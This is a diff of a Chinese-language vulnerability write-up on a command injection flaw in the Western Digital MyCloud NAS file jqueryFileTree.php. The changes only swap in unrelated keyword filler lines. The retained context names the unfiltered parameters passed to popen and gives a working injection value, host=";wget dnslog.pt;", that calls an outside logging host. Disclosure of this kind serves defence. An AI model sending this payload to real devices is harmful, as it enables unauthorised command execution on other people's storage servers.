@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS jqueryFileTree.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
 
-漏洞预警服务
+硬盘驱动器
 
 # 影响版本
 
@@ -63,6 +63,14 @@ error_reporting(0);
        $handle = popen($cmd, 'r');
 ```
 
+深入探索
+
+安全审计服务
+
+文件大小转换
+
+Web安全课程
+
 多个参数如`host`、`pwd`、`user`、`dir`、`lang`均未过滤或校验，被直接使用`sprintf`格式化拼接后使用`popen`进行[执行命令](https://mrxn.net/tag/rce)，造成[命令注入漏洞](https://mrxn.net/tag/rce)。
 
 # 漏洞复现
@@ -79,4 +87,4 @@ host=";wget dnslog.pt;"
 
 在DNSLOG平台成功收到DNS和HTTP请求
 
-硬盘驱动器
+数据备份与恢复
